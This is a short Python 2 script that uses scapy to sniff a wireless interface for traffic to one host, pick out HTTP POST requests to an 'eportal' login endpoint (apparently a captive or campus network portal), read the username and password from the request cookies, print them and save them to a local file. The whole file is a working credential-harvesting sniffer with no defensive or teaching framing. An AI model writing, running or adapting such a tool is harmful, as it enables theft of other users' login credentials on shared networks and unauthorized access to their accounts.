#!/usr/bin/env python
#coding:utf-8

from scapy.all import *
import scapy_http.http as http
import json, pickle

account = {}

def show(pkt):
    if pkt.haslayer(http.HTTPRequest):
        if pkt.Method == u'POST' and pkt.Path == u'/eportal/InterFace.do?method=login':
            #print pkt.show()
            pkt_cookie = {}
            pkt_cookies = pkt.Cookie.split(';')
            for i in range(len(pkt_cookies)):
                pkt_cookie[pkt_cookies[i].split('=')[0].strip()] = pkt_cookies[i].split('=')[1]
            
            #print pkt_cookie
            username = pkt_cookie[u'EPORTAL_COOKIE_USERNAME']
            password = pkt_cookie[u'EPORTAL_COOKIE_PASSWORD']
            print 'username: ', username, 'password: ', password
            
            #store
            if username not in account:
                account[username] = password
                with open('./account.txt', 'a+') as f:
                    f.writelines('%s\t%s\n' % (username, password))
            
def main():
    while(True):
        try:
            sniff(iface='wlan0', filter='ip host 222.198.127.170', prn=lambda x:show(x))
        except BaseException, e:
            print e
            
if __name__ == '__main__':
    main()